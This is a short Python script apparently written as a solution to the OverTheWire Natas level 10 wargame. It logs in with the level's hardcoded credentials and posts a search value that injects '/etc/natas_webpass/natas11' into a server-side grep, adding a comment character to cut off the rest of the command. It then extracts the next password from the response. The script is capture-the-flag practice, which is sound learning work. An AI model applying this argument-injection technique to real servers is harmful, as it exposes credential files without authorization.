#!/usr/bin/env python

# Remote Code Injection

# import the package requests which is for html information
import requests
import re

username = 'natas10'
password = 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE'

url = 'http://%s.natas.labs.overthewire.org/' % username


# blank temp response = requests.get(url,auth = (username, password))

session = requests.Session()

response = requests.get(url,auth = (username, password))
response = requests.post(url,data = { "needle" :'. /etc/natas_webpass/natas11 #', 'submit' : 'submit'} ,auth = (username, password))
# . means to grep for anything, so grep for anything and then insert a directory we want to find
# which is trying to find the folder for the password, and then the hashtag symbol at the end
# is to comment out anything else, or maybe not comment out but to get rid of all the other
# dictionary outputs
content = response.text


# print(content)
# (.*)

print(re.findall("<pre>\n(.*)\n</pre>", content)[0])